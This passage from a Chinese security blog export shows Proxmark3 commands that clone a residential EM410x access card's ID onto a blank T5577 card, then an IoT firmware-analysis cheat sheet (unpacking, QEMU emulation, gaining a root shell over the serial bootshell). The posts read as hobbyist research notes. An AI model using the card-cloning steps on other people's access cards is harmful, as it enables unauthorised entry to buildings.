title="某小区门禁卡1(ID卡)"></a>某小区门禁卡1(ID卡)</h3><p><code>lf search</code>检测卡片类型为<code>EM410x</code>，卡号为<code>28007A8A1C</code></p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">proxmark3&gt; lf search<br><span class="hljs-comment">#db# LF Sampling config:                 </span><br>...   <br>Checking for known tags:<br>          <br>EM410x pattern found:           <br><br>EM <span class="hljs-keyword">TAG</span> <span class="hljs-title">ID</span>      : <span class="hljs-number">28007</span>a8a1c          <br>Unique <span class="hljs-keyword">TAG</span> <span class="hljs-title">ID</span>  : <span class="hljs-number">14005</span>e5138          <br>...      <br>Valid EM410x ID Found!   <br></code></pre></td></tr></table></figure><p>放上空白T5577卡，写入卡号</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">proxmark3</span>&gt; lf em4x em410xwrite <span class="hljs-number">28007</span>A8A1C <span class="hljs-number">1</span> <span class="hljs-number">64</span><br></code></pre></td></tr></table></figure><p>再次<code>lf search</code>确认卡号已改变</p><h3 id="某小区门禁卡2-M1卡"><a href="#某小区门禁卡2-M1卡" class="headerlink" title="某小区门禁卡2(M1卡)"></a>某小区门禁卡2(M1卡)</h3><h3 id="某校园一卡通-CPU卡"><a href="#某校园一卡通-CPU卡" class="headerlink" title="某校园一卡通(CPU卡)"></a>某校园一卡通(CPU卡)</h3><p>SAK&#x3D;20的CPU卡，目前没有公开的破解手段</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs ada">proxmark3&gt; hf <span class="hljs-number">14</span>a reader<br>ATQA : 00 08          <br> UID : 59 <span class="hljs-type">b9</span> <span class="hljs-number">75</span> <span class="hljs-number">3</span>f           <br> SAK : 20 [1]          <br><span class="hljs-keyword">TYPE</span> <span class="hljs-type">: </span>NXP MIFARE DESFire <span class="hljs-number">4</span>k | DESFire EV1 <span class="hljs-number">2</span>k/<span class="hljs-number">4</span>k/<span class="hljs-number">8</span>k | Plus <span class="hljs-number">2</span>k/<span class="hljs-number">4</span>k SL3 | JCOP <span class="hljs-number">31</span>/<span class="hljs-number">41</span>          <br> ATS : 0<span class="hljs-type">e</span> <span class="hljs-number">77</span> <span class="hljs-number">33</span> a0 <span class="hljs-number">02</span> <span class="hljs-number">86</span> <span class="hljs-number">88</span> <span class="hljs-number">47</span> <span class="hljs-number">48</span> f2 <span class="hljs-number">59</span> b9 <span class="hljs-number">75</span> <span class="hljs-number">3</span>f d3 <span class="hljs-number">08</span>           <br>       -  TL : <span class="hljs-type">length</span> <span class="hljs-keyword">is</span> <span class="hljs-number">14</span> bytes          <br>       -  T0 : <span class="hljs-type">TA1</span> <span class="hljs-keyword">is</span> present, TB1 <span class="hljs-keyword">is</span> present, TC1 <span class="hljs-keyword">is</span> present, FSCI <span class="hljs-keyword">is</span> <span class="hljs-number">7</span> (FSC = <span class="hljs-number">128</span>)          <br>       - TA1 : <span class="hljs-type">different</span> divisors are supported, DR: [<span class="hljs-number">2</span>, <span class="hljs-number">4</span>], DS: [<span class="hljs-number">2</span>, <span class="hljs-number">4</span>]          <br>       - TB1 : <span class="hljs-type">SFGI</span> = <span class="hljs-number">0</span> (SFGT = (<span class="hljs-keyword">not</span> needed) <span class="hljs-number">0</span>/fc), FWI = <span class="hljs-number">10</span> (FWT = <span class="hljs-number">4194304</span>/fc)          <br>       - TC1 : <span class="hljs-type">NAD</span> <span class="hljs-keyword">is</span> <span class="hljs-keyword">NOT</span> supported, CID <span class="hljs-keyword">is</span> supported          <br>       -  HB : 86 88 47 48 <span class="hljs-type">f2</span> <span class="hljs-number">59</span> b9 <span class="hljs-number">75</span> <span class="hljs-number">3</span>f           <br>Answers to chinese magic backdoor commands: NO <br></code></pre></td></tr></table></figure><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://proxmark.com/">Proxmark官网</a></p><p><a href="https://github.com/Proxmark/proxmark3">Pm3 官方固件 Github仓库</a></p><p><a href="https://github.com/RfidResearchGroup/proxmark3?tab=readme-ov-file#iceman-fork---proxmark3">Pm3 RRG固件 Github仓库</a></p><p><a href="https://github.com/iceman1001/proxmark3">Pm3 iceman(冰人)固件 Github仓库</a></p><p><a href="https://github.com/brad-anton/proxbrute">Pm3 proxbrute固件 Github仓库</a></p><p><a href="https://ulyc.github.io/2020/01/18/%E5%B8%B8%E8%A7%81RFID%E5%8D%A1%E7%89%87%E4%BB%8B%E7%BB%8D-%E7%A0%B4%E8%A7%A3%E6%80%9D%E8%B7%AF-%E5%8F%8A-Proxmark3%E7%AE%80%E4%BB%8B/">常见RFID卡片介绍、破解思路 及 Proxmark3简介</a></p><p><a href="https://firefox2100.github.io/proxmark3/2020/10/12/Proxmark3/">Proxmark3 常见问题整理</a></p><p><a href="https://lzy-wi.github.io/2018/07/26/proxmark3/#%E7%A1%AC%E4%BB%B6%E5%87%86%E5%A4%87">Proxmark3 Easy破解门禁卡学习过程</a></p>]]></content>
    
    
    <categories>
      
      <category>IOT</category>
      
    </categories>
    
    
    <tags>
      
      <tag>IOT</tag>
      
      <tag>智能卡</tag>
      
      <tag>硬件</tag>
      
      <tag>PM3</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>IOT_cheat_sheet</title>
    <link href="/2024/10/13/IOT-cheat-sheet/"/>
    <url>/2024/10/13/IOT-cheat-sheet/</url>
    
    <content type="html"><![CDATA[<h1 id="IOT-cheat-sheet"><a href="#IOT-cheat-sheet" class="headerlink" title="IOT cheat sheet"></a>IOT cheat sheet</h1><p>记录iot安全中常用的工具&#x2F;命令，用作备忘录方便查看，持续施工中</p><h2 id="固件解包"><a href="#固件解包" class="headerlink" title="固件解包"></a>固件解包</h2><h3 id="hexdump"><a href="#hexdump" class="headerlink" title="hexdump"></a>hexdump</h3><ul><li><code>hexdump -C filename | grep -i &#39;string&#39;</code></li></ul><p>搜索文件中的指定字符串，并查看数据的16进制形式及地址。</p><h3 id="strings"><a href="#strings" class="headerlink" title="strings"></a>strings</h3><ul><li><code>strings filename | grep -i &#39;string&#39;</code></li></ul><p>在文件中搜索指定字符串，常用于查找签名或特征字符串。</p><h3 id="dd"><a href="#dd" class="headerlink" title="dd"></a>dd</h3><ul><li><code>dd if=输入文件名 of=输出文件名 bs=一个数据块的字节数 skip=从文件头开始跳过数据块的数量 count=输出数据块的数量 </code></li></ul><p>用于更细粒度地提取文件中的数据。</p><h3 id="file"><a href="#file" class="headerlink" title="file"></a>file</h3><p>识别常见文件类型</p><ul><li><code>dd | file</code></li></ul><p>可结合dd命令分析指定区块数据的文件类型。</p><h3 id="binwalk"><a href="#binwalk" class="headerlink" title="binwalk"></a>binwalk</h3><ul><li><code>binwalk filename</code></li></ul><p>分析文件。</p><ul><li><code>binwalk -Y filename</code></li></ul><p>使用 capstone 反汇编器识别文件的 CPU 架构。</p><ul><li><code>binwalk -E filename</code></li></ul><p>计算文件的熵值。熵值越大，越有可能是加密的或是压缩过的。</p><ul><li><code>binwalk -Me filename</code></li></ul><p>提取文件并在提取过程中自动尝试解密已知的加密算法。</p><h3 id="lzma"><a href="#lzma" class="headerlink" title="lzma"></a>lzma</h3><p>LZMA，历史遗留的老文件格式，正在被xz取代，只支持.lzma</p><ul><li><code>lzma -d -k filename</code></li></ul><h3 id="xz"><a href="#xz" class="headerlink" title="xz"></a>xz</h3><p>xz又称LZMA2，是LZMA压缩的替代，支持.xz和.lzma</p><ul><li><code>xz -d -k filename</code></li></ul><p>有的厂商会魔改压缩算法后使用自定义的魔改xz工具</p><h3 id="find"><a href="#find" class="headerlink" title="find"></a>find</h3><p>根据文件名在指定目录中递归地查找某文件，文件名可使用通配符</p><ul><li><code>find /path_to/dictionary -name &quot;*.txt&quot;</code></li></ul><h3 id="grep"><a href="#grep" class="headerlink" title="grep"></a>grep</h3><p>列出字符匹配的文件内容或文件名</p><ul><li><code>grep -rnw &#39;./&#39; -e &#39;update\|firmware\|upgrade\|download&#39;</code></li></ul><p>‌‌‌‌‍‬‍‬</p><h3 id="文件系统解压"><a href="#文件系统解压" class="headerlink" title="文件系统解压"></a>文件系统解压</h3><h4 id="squashfs"><a href="#squashfs" class="headerlink" title="squashfs"></a>squashfs</h4><ul><li><code>unsquashfs filesystem</code></li></ul><p>适用于解压标准SquashFS格式文件镜像，源于Squashfs-tools项目</p><p><a href="https://github.com/plougher/squashfs-tools">项目地址</a></p><ul><li><code>sasquatch filesystem</code></li></ul><p>针对非标准的SquashFS格式文件镜像(如LZMA和XZ)，<a href="https://github.com/devttys0/sasquatch">项目地址</a></p><p>tips:常见squashfs压缩算法包括GZIP、LZMA、LZO、XZ(LZMA2)等。很多厂商在打包文件系统时使用自定义的非标准squashfs压缩算法(如魔改LZMA和魔改XZ)。如果无法直接<code>binwalk</code>提取，则需要手动搜索squashfs文件系统的头部特征字符串，找到大小和偏移并提取出文件系统镜像，然后用<code>sasquatch</code>以及厂商自定义的<code>lzma</code>、<code>xz</code>等工具解压。</p><p>针对魔改squashfs，unsquashfs时出现Can’t find a valid SQUASHFS superblock报错，说明很可能文件头部的超级块结构被修改，我们需要将其与正常文件对照或逆向相关程序对超级块进行恢复。该结构体的定义位于squashfs-tools源码中的squashfs_fs.h文件，含义参考该<a href="https://sabersauce.github.io/2016/07/28/squashFS-%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F/">文章</a>。</p><p><a href="https://github.com/sbourdelin/squashfs-info">squashfs-info</a>工具可以输出squashfs的超级块各字段值。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">struct</span> <span class="hljs-title class_">squashfs_super_block</span> &#123;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>        s_magic;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>        inodes;<br><span class="hljs-type">int</span>                    mkfs_time;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>        block_size;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>        fragments;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">short</span>        compression;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">short</span>        block_log;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">short</span>        flags;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">short</span>        no_ids;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">short</span>        s_major;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">short</span>        s_minor;<br>squashfs_inode        root_inode;<br><span class="hljs-type">long</span> <span class="hljs-type">long</span>        bytes_used;<br><span class="hljs-type">long</span> <span class="hljs-type">long</span>        id_table_start;<br><span class="hljs-type">long</span> <span class="hljs-type">long</span>        xattr_id_table_start;<br><span class="hljs-type">long</span> <span class="hljs-type">long</span>        inode_table_start;<br><span class="hljs-type">long</span> <span class="hljs-type">long</span>        directory_table_start;<br><span class="hljs-type">long</span> <span class="hljs-type">long</span>        fragment_table_start;<br><span class="hljs-type">long</span> <span class="hljs-type">long</span>        lookup_table_start;<br>&#125;;<br></code></pre></td></tr></table></figure><h4 id="Yaffs-x2F-Yaffs2"><a href="#Yaffs-x2F-Yaffs2" class="headerlink" title="Yaffs&#x2F;Yaffs2"></a>Yaffs&#x2F;Yaffs2</h4><p>Yaffs(Yet Another FlashFile System)文件系统是专门针对NAND闪存设计的嵌入式文件系统，目前有YAFFS和YAFFS2两个版本，两个版本的主要区别之一在于YAFFS2能够更好的支持大容量的NAND FLASH芯片。</p><ul><li><p>解包工具<code>unyaffs</code></p></li><li><p>打包工具<code>mkyaffs2</code></p></li></ul><p>源码: <a href="https://code.google.com/archive/p/yaffs2utils/">https://code.google.com/archive/p/yaffs2utils</a><a href="https://code.google.com/archive/p/yaffs2utils/">&#x2F;</a></p><p>unyaffs可通过pip install安装</p><h4 id="JFFS-x2F-JFFS2"><a href="#JFFS-x2F-JFFS2" class="headerlink" title="JFFS&#x2F;JFFS2"></a>JFFS&#x2F;JFFS2</h4><ul><li>解包工具<code>jefferson</code>：<a href="https://github.com/onekey-sec/jefferson/">项目地址</a></li></ul><h4 id="cramfs"><a href="#cramfs" class="headerlink" title="cramfs"></a>cramfs</h4><p>使用<code>cramfsprogs</code>包中的<code>cramfsck</code>工具解析cramfs文件系统镜像</p><p><code>cramfsprogs</code>包从ubuntu1804开始不再支持，所以需要手动安装。</p><p><a href="https://launchpad.net/ubuntu/xenial/+package/cramfsprogs">网址1</a>可以下载deb包，通过<code>sudo apt install -f file.deb</code>安装</p><p><a href="https://launchpad.net/ubuntu/+source/cramfs/+publishinghistory">网址2</a>可以下载源码，在源码中添加<code>#include &lt;sys/sysmacros.h&gt;</code>头文件后<code>sudo make</code>编译得到所需工具</p><p><code>cramfsck</code>工具提取时需要root权限来创建设备节点，否则提取不完全。</p><h4 id="Ubifs"><a href="#Ubifs" class="headerlink" title="Ubifs"></a>Ubifs</h4><p>可使用现成开源解包工具<code>ubi_reader</code>，也可通过挂载方式读取文件，挂载的方式比较繁琐。</p><ul><li>ubi_reader</li></ul><p>项目地址:<a href="https://github.com/jrspruitt/ubi_reader">https://github.com/jrspruitt/ubi_reader</a></p><p>可以直接通过pip安装</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell">//安装依赖<br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo apt-get install liblzo2-dev</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo pip install python-lzo</span><br>//安装ubi_reader<br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo pip install ubi_reader</span><br></code></pre></td></tr></table></figure><p>ubi_reader提供了4个命令</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell">ubireader_display_info   //获取UBI信息以及布局块等信息<br>ubireader_extract_images  //提取镜像<br>ubireader_extract_files  //提取ubifs镜像中的文件内容<br>ubireader_utils_info  //分析UBI镜像并创建shell脚本和UBI配置文件<br></code></pre></td></tr></table></figure><h4 id="ubi卷上的squashfs"><a href="#ubi卷上的squashfs" class="headerlink" title="ubi卷上的squashfs"></a>ubi卷上的squashfs</h4><p>ubi镜像的卷(volumn)上除了存放ubifs镜像，也可以存放squashfs等其它文件系统镜像。提取ubi镜像中除ubifs之外的文件系统中的文件时，由于<code>ubireader_extract_files</code>命令只能识别ubifs，我们需要先<code>ubireader_extract_images</code>提取出文件系统镜像，再使用对应工具提取文件。</p><p><code>binwalk</code>只使用<code>ubireader_extract_files</code>提取ubi镜像的内容，所以当ubi镜像中存在其它文件系统时无法binwalk一把梭。</p><h2 id="固件仿真"><a href="#固件仿真" class="headerlink" title="固件仿真"></a>固件仿真</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo apt-get install qemu-user qemu-system qemu-user-static gdb-multiarch <br></code></pre></td></tr></table></figure><p><a href="https://quard-star-tutorial.readthedocs.io/zh-cn/latest/ext3.html">qemu常用参数选项说明</a></p><h3 id="系统级仿真"><a href="#系统级仿真" class="headerlink" title="系统级仿真"></a>系统级仿真</h3><h4 id="armel"><a href="#armel" class="headerlink" title="armel"></a>armel</h4><p><a href="https://people.debian.org/~aurel32/qemu/armhf/">镜像地址</a></p><p>使用<code>wget url</code>获取磁盘镜像、内核镜像以及initrd.img(ramdisk文件)</p><p>启动脚本<code>run.sh</code>，配置宿主机网卡并启动仿真机</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo tunctl -t tap0 -u `whoami`<br>sudo ifconfig tap0 192.168.2.1/24<br>sudo qemu-system-arm -M versatilepb -kernel vmlinuz-3.2.0-4-versatile -initrd initrd.img-3.2.0-4-versatile -hda debian_wheezy_armel_standard.qcow2 -append &quot;root=/dev/sda1&quot; -net nic -net tap,ifname=tap0,script=no,downscript=no -nographic<br></code></pre></td></tr></table></figure><p>配置仿真机网卡</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">root@debian-armel:~# ifconfig eth0 192.168.2.2/24<br></code></pre></td></tr></table></figure><p>从宿主机将文件系统压缩并传入仿真机</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">tar -cvf squashfs-root.tar ./squashfs-root<br>scp ./squashfs-root.tar  root@192.168.2.2:/root<br></code></pre></td></tr></table></figure><p>仿真机解压文件系统</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">root@debian-armel:~# tar -xvf squashfs-root.tar<br></code></pre></td></tr></table></figure><p>将仿真机的<code>/dev</code>和<code>/proc</code>挂载到下一步chroot的环境中</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">mount -o bind /dev ./squashfs-root/dev<br>mount -t proc /proc ./squashfs-root/proc/<br></code></pre></td></tr></table></figure><p>根目录切换至固件文件系统并启动chroot环境的shell</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">chroot ./squashfs-root/ sh<br></code></pre></td></tr></table></figure><h4 id="armhf"><a href="#armhf" class="headerlink" title="armhf"></a>armhf</h4><p><a href="https://people.debian.org/~aurel32/qemu/armhf/">镜像地址</a></p><p>使用<code>wget url</code>获取磁盘镜像、内核镜像以及initrd.img(ramdisk文件)</p><p>启动脚本<code>run.sh</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo tunctl -t tap0 -u `whoami`<br>sudo ifconfig tap0 192.168.2.1/24<br>sudo qemu-system-arm -M vexpress-a9 -kernel vmlinuz-3.2.0-4-vexpress -initrd initrd.img-3.2.0-4-vexpress -drive if=sd,file=debian_wheezy_armhf_standard.qcow2 -append &quot;root=/dev/mmcblk0p2&quot; -net nic -net tap,ifname=tap0,script=no,downscript=no -nographic<br></code></pre></td></tr></table></figure><p>配置仿真机网卡</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">root@debian-armhf:~# ifconfig eth0 192.168.2.2/24<br></code></pre></td></tr></table></figure><p>从宿主机将文件系统压缩并传入仿真机</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">tar -cvf squashfs-root.tar ./squashfs-root<br>scp ./squashfs-root.tar  root@192.168.2.2:/root<br></code></pre></td></tr></table></figure><p>仿真机解压文件系统</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">root@debian-armhf:~# tar -xvf squashfs-root.tar<br></code></pre></td></tr></table></figure><p>将仿真机的<code>/dev</code>和<code>/proc</code>挂载到下一步chroot的环境中</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">mount -o bind /dev ./squashfs-root/dev<br>mount -t proc /proc ./squashfs-root/proc/<br></code></pre></td></tr></table></figure><p>根目录切换至固件文件系统并启动chroot环境的shell</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">chroot ./squashfs-root/ sh<br></code></pre></td></tr></table></figure><h4 id="aarch64"><a href="#aarch64" class="headerlink" title="aarch64"></a>aarch64</h4><h4 id="mipsel"><a href="#mipsel" class="headerlink" title="mipsel"></a>mipsel</h4><h4 id="long-arch"><a href="#long-arch" class="headerlink" title="long-arch"></a>long-arch</h4><h4 id="x86-64"><a href="#x86-64" class="headerlink" title="x86-64"></a>x86-64</h4><h4 id="cleanup"><a href="#cleanup" class="headerlink" title="cleanup"></a>cleanup</h4><p>关闭仿真机</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo killall qemu-system-arm<br></code></pre></td></tr></table></figure><p>取消挂载</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">umount ./squashfs-root/dev/<br>umount ./squashfs-root/proc/<br></code></pre></td></tr></table></figure><h3 id="用户态仿真"><a href="#用户态仿真" class="headerlink" title="用户态仿真"></a>用户态仿真</h3><ul><li><code>chroot + qemu/qemu-static</code></li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo chroot ./ ./qemu-mips-static /bin/sh<br></code></pre></td></tr></table></figure><p>可在qemu命令后添加<code>-strace</code>输出仿真程序运行时的系统调用信息</p><h3 id="文件系统挂载"><a href="#文件系统挂载" class="headerlink" title="文件系统挂载"></a>文件系统挂载</h3><p>挂载，指将文件系统中的顶级目录连接到Linux根目录下的某一目录，挂载操作会使得原有目录中文件被隐藏。进行系统级仿真时需要将解包出的文件系统挂载到仿真机中。</p><ul><li><code>mount</code> 或 <code>cat /etc/mtab</code></li></ul><p>查看已挂载的设备</p><ul><li><code>mount device/filesystem dir</code></li></ul><p>将设备文件&#x2F;文件系统挂载到<code>dir</code>目录。加<code>-t fstype</code>参数可以指定文件系统类型，否则自动识别文件系统类型</p><p>例: <code>mount /dev/sdb1 /mnt/data</code>，将<code>sdb1</code>分区挂载到<code>mnt/data</code>目录</p><ul><li><code>mount --bind olddir newdir</code></li></ul><p>把目录树的一棵子树挂载到其他地方</p><ul><li><code>umount [参数] -t [文件系统类型] [设备名称]</code></li></ul><p>卸载已经挂载的设备或文件系统</p><ul><li><code>/etc/mtab</code></li></ul><p>记录了当前挂载的文件系统信息。</p><p>格式：设备名称    挂载点     分区的类型  挂载选项   dump选项 fsck选项</p><ul><li><code>/etc/fstab</code></li></ul><p>文件系统挂载的配置文件，定义了系统启动时应该自动挂载的文件系统，并指定了挂载选项。</p><ul><li>磁盘分区文件命名规则</li></ul><p>以<code>/dev/sda5</code>为例 : <code>/dev</code>说明这是一个硬件设备；<code>sd</code>表示是存储设备；<code>a</code>表示系统中同类型接口中第一个被识别到的设备，比如有两个硬盘设备，则分别为sda和sdb；<code>5</code>表示设备中逻辑分区的编号。</p><h2 id="抓包"><a href="#抓包" class="headerlink" title="抓包"></a>抓包</h2><h3 id="tcpdump"><a href="#tcpdump" class="headerlink" title="tcpdump"></a>tcpdump</h3><h2 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h2><h3 id="gdb-multiarch"><a href="#gdb-multiarch" class="headerlink" title="gdb-multiarch"></a>gdb-multiarch</h3><h2 id="设备启动流程"><a href="#设备启动流程" class="headerlink" title="设备启动流程"></a>设备启动流程</h2><p>IOT设备中很多服务程序为开机自启的守护进程(deamon)，仿真及分析时需要了解其启动方式，寻找对应文件中的启动参数等，因此有必要了解嵌入式linux的大致启动流程，尤其是了解启动脚本等关键文件。</p><ul><li>上电</li><li>BIOS&#x2F;UEFI</li><li>bootloader</li><li>加载内核，挂载文件系统</li><li>运行根文件系统中的初始化脚本和服务</li></ul><h2 id="调试串口及串口shell"><a href="#调试串口及串口shell" class="headerlink" title="调试串口及串口shell"></a>调试串口及串口shell</h2><p><strong>调试串口分类</strong></p><p>能获取shell的串口主要是UART和SWD&#x2F;JTAG；还有其它接口无法获取shell，但也存在安全风险</p><ul><li><p>UART</p></li><li><p>SWD&#x2F;JTAG</p></li><li><p>其它：I2C&#x2F;SPI、OBD、USB等</p></li></ul><p><strong>串口shell</strong></p><p>连上设备后先启动boot shell，再进入Linux shell</p><ul><li>boot shell</li></ul><p>加载内核前boot阶段运行的裸机程序，功能一般包括：tftp获取外部文件、读内存、读写rom、查看rom分区等。</p><p>bootshell提供的指令因设备而异，在提供了内存或rom的读写功能时可以尝试从内存或rom提取固件。</p><p>关于串口的bootshell有这几种情况：直接进入bootshell、需要按键进入bootshell、没有bootshell。</p><p>除此之外，还有一种通过bootshell获取Linux root shell的思路：提取文件系统 -&gt;  修改文件系统，删除关闭串口Linux Shell的代码并修改root用户密码 -&gt; 将修改后的文件系统重新打包并通过tftp传入设备 -&gt; 通过bootshell修改rom中固件的文件系统为我们传入的文件系统 -&gt; 重启设备。<a href="https://www.anquanke.com/post/id/275630#h2-3">参考文章</a></p><ul><li>linux shell</li></ul><p>操作系统初始化完成后提供给串口的shell，有以下几种情况：</p><p>1.关闭了串口的终端</p><p>2.Linux shell存在密码</p><p>3.只提供功能受限的cli shell</p><h2 id="厂商汇总及固件下载"><a href="#厂商汇总及固件下载" class="headerlink" title="厂商汇总及固件下载"></a>厂商汇总及固件下载</h2><p><a href="https://www.asus.com.cn/networking-iot-servers/wifi-routers/all-series/">华硕</a>，选择路由器产品，服务支持-&gt;驱动程序和工具软件-&gt;BIOS &amp; 固件</p><p><img src="/2024/10/13/IOT-cheat-sheet/1.png" alt="1"></p><p><a href="https://www1.miwifi.com/wap_download.html">小米</a> 下载-&gt;ROM</p><p><a href="https://software.cisco.com/download/home">思科cisco</a>(下载需要官方授权),最下方Select a Product-&gt;browser all</p><p><a href="https://store.linksys.com/linksys-support">Linksys</a>，Linksys是思科的一个部门，主营家用和小型网络产品，思科官网主要提供企业级路由器固件，家庭小型设备固件如EA系列路由器需要到Linksys官网下载</p><p><a href="https://service.tp-link.com.cn/m/download?classtip=software&p=1&o=0">tp-link</a>,下载中心-&gt;升级软件</p><p><a href="https://www.tenda.com.cn/download/cata-11.html">tenda腾达</a>,升级软件</p><p>网件Netgear，<a href="http://support.netgear.cn/support/download.asp">中国官网固件下载</a>&#x2F;<a href="https://www.netgear.com/support/download/">国外官网固件下载</a></p><p>华为&#x2F;h3c-&gt;不公开,需要授权账号</p><p>友讯D-LINK，<a href="https://support.dlink.com/resource/products/">仓库</a>和<a href="https://legacyfiles.us.dlink.com/">不再更新的产品仓库</a> ; <a href="https://support.dlink.com/index.aspx">官网</a>，<a href="https://tsd.dlink.com.tw/">台湾官网</a>，<a href="http://www.dlink.com.cn/techsupport/">中国官网</a>-&gt;搜索型号或下方页面的下载选择型号</p><p><a href="https://www.totolink.net/home/news/me_name/id/39/menu_listtpl/DownloadC.html">totolink</a>-&gt;搜索或选择设备型号-&gt;跳转到设备界面后Download</p><p><a href="https://www.vivotek.com/downloads/product">vivotak</a>-&gt;选择要下载的设备型号和资源类型，比如下图中筛选的是180°全景网络摄像头</p><p><img src="/2024/10/13/IOT-cheat-sheet/2.png" alt="2"></p><p><a href="https://openwrt.org/">openwrt</a>-&gt;不同的openwrt版本下有固件下载链接，同一版本的openwrt针对不同路由器有不同的固件</p><p><a href="https://www.ruijie.com.cn/fw/rj/">锐捷</a>-&gt;服务支持-&gt;软件下载</p><p>DrayTek -&gt; <a href="https://www.draytek.com/support/resources/routers#version">官网固件下载</a>或<a href="https://fw.draytek.com.tw/">FTP服务器</a></p><p>四海众联COMFAST -&gt; <a href="http://www.comfast.com.cn/">官网</a> -&gt; 产品中心 -&gt; 选择设备 -&gt; 资料下载</p><p><a href="http://www.kejixia.cn/index.jsp?pageNum=1#/">科技侠sciener</a>（智能门禁、智能锁厂商） </p>]]></content>
    
    
    <categories>
      
      <category>IOT</category>
      
    </categories>
    
    
    <tags>
      
      <tag>IOT</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>步入暗网-匿名网络使用指南</title>
    <link href="/2024/10/13/%E6%AD%A5%E5%85%A5%E6%9A%97%E7%BD%91-%E5%8C%BF%E5%90%8D%E7%BD%91%E7%BB%9C%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/"/>
    <url>/2024/10/13/%E6%AD%A5%E5%85%A5%E6%9A%97%E7%BD%91-%E5%8C%BF%E5%90%8D%E7%BD%91%E7%BB%9C%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/</url>
    
